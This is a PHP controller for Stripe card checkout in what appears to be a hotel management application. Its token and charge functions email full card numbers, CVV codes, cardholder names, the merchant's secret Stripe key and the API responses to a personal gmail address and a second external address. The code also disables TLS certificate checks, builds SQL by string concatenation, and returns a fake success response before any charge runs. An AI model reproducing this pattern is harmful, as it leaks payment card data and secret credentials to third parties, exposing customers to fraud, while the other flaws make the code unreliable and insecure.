<?php	

class Stripe_payment extends CI_Controller{



	public function index(){

	}

	public function checkout()
	{

        $mail_data = '<strong> Request </strong> <br>';
		$property_name = ucfirst(get_data(HOTEL,array('hotel_id'=>hotel_id()))->row()->property_name);
		//Busco skApikey para el Hotel
		$skApikeyinfo = $this->db->query("select * from paymentmethod where providerid =1 and hotelid=".hotel_id())->row_array();
		
////testtes

		$lon=(strlen(number_format(str_replace(',', '', $_POST['amountdue']) , 2, '', ''))-2);

		$data['success']=true;
		$data['amount']=number_format(substr(number_format(str_replace(',', '', $_POST['amountdue']) , 2, '', ''),0,$lon), 0, '', ',').'.'.substr(number_format(str_replace(',', '', $_POST['amountdue']) , 2, '', ''),-2);
		$data['currency']=$_POST['currency'];
		$data['statement_descriptor']=substr($_POST['channelname']." - ".$property_name, 0, 22);
		$data['description']=str_replace("&","Y",$_POST['Description']);
		echo json_encode($data);
/////test

		 return;
		if(count($skApikeyinfo)>0)
		{

		 	
				$skApikey = $skApikeyinfo['apikey'];
				$token = $this->CrearToken($skApikey);

				if (strlen($token["error"])==0)
				{
					$data="capture=true&amount=".number_format(str_replace(',', '', $_POST['amountdue']) , 2, '', '')."&currency=".strtolower($_POST['currency'])."&card=".$token['id']."&description=".str_replace("&","Y",$_POST['Description'])."&statement_descriptor=".substr($_POST['channelname']." - ".$property_name, 0, 22);

					$Charge=$this->Charge($data,$skApikey);

						if (strlen($Charge["error"])==0)
						{
							$lon=(strlen($Charge['amount'])-2);
							$data['success']=true;
							$data['amount']=number_format(substr($Charge['amount'],0,$lon), 0, '', ',').'.'.substr($Charge['amount'],-2);
							$data['currency']=$_POST['currency'];
							$data['description']=$Charge['description'];
							$data['transaction']=$Charge['id'];
						}
						else
						{
							$data['success']=false;
							$data['error']=$Charge["error"];						
						}
			
				}
				else
				{
					$data['success']=false;
					$data['error']=$token["error"];				
				}
				
		}
		else
		{

			$data['success']=false;
			$data['error']="Stripe is not connected, configure stripe and try again";			
		}	

	
		echo json_encode($data); 
		
	}

	public function CrearToken($skApikey)
	{
			
               
       
               		$URL = 'https://api.stripe.com/v1/tokens';
              
                   
                 	$XML ="card[number]=".$_POST['ccnumber']."&card[exp_month]=".$_POST['ccmonth']."&card[exp_year]=".$_POST['ccyear'].(isset($_POST['sendcvv'])?"&card[cvc]=".$_POST['cccvv']:"")."&card[name]=".$_POST['ccholder']."&card[address_country]=".$_POST['cccountry']."&key=".$skApikey;
                 	$mail_data = '<strong> Request </strong> <br>';
					$mail_data .= $XML;
					mail("datahernandez@gmail.com"," Stripe.Com Request and Response Token ",$mail_data);
                    $ch = curl_init($URL);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_HTTPHEADER,  array("Authorization: Bearer ".$skApikey));
                    curl_setopt($ch, CURLOPT_POSTFIELDS,$XML );
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

                    $output = curl_exec($ch);
                    $mail_data = '<strong> Response </strong> <br>';
					$mail_data .= $output;	
					mail("datahernandez@gmail.com"," Stripe.Com Request and Response Token ",$mail_data);
					mail("xml@hoeratus.com"," Stripe.Com Request and Response Token",$mail_data);
                    curl_close($ch); 

                    $result = (json_decode($output,true));

                    $data['error']='';
                    //print_r($result);
                    foreach ($result as $value) {
                  
                    	if(isset($value['message'])){
                    		$data['error']=	$value['message'];
                    	}
                    	else
                    	{
                    		$data =array_merge($data,$result);
                    	}


                    }
                    	
	
                
                	return($data);              
                	   
	}
 	
 	public function Charge($datacharge,$skApikey)
 	{

 					$mail_data = '<strong> Request </strong> <br>';
					$mail_data .= $datacharge;
 		 			$ch = curl_init('https://api.stripe.com/v1/charges');
                    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_HTTPHEADER,  array("Authorization: Bearer ".$skApikey));
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $datacharge);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

                    $output = curl_exec($ch);
                    $mail_data .= '<strong> Response </strong> <br>';
					$mail_data .= $output;	
					mail("datahernandez@gmail.com"," Stripe.Com Request and Response Charge ",$mail_data);
					mail("xml@hoeratus.com"," Stripe.Com Request and Response Charge",$mail_data);
                    curl_close($ch); 

                    $result = (json_decode($output,true));


                    $data['error']='';
                    //print_r($result);
                    foreach ($result as $value) {
                  
                    	if(isset($value['message'])){
                    	$data['error']=	$value['message'];
                    	}
                    	else
                    	{
                    		$data =array_merge($data,$result);
                    	}


                    }

                	return($data);   

 	}


}


?>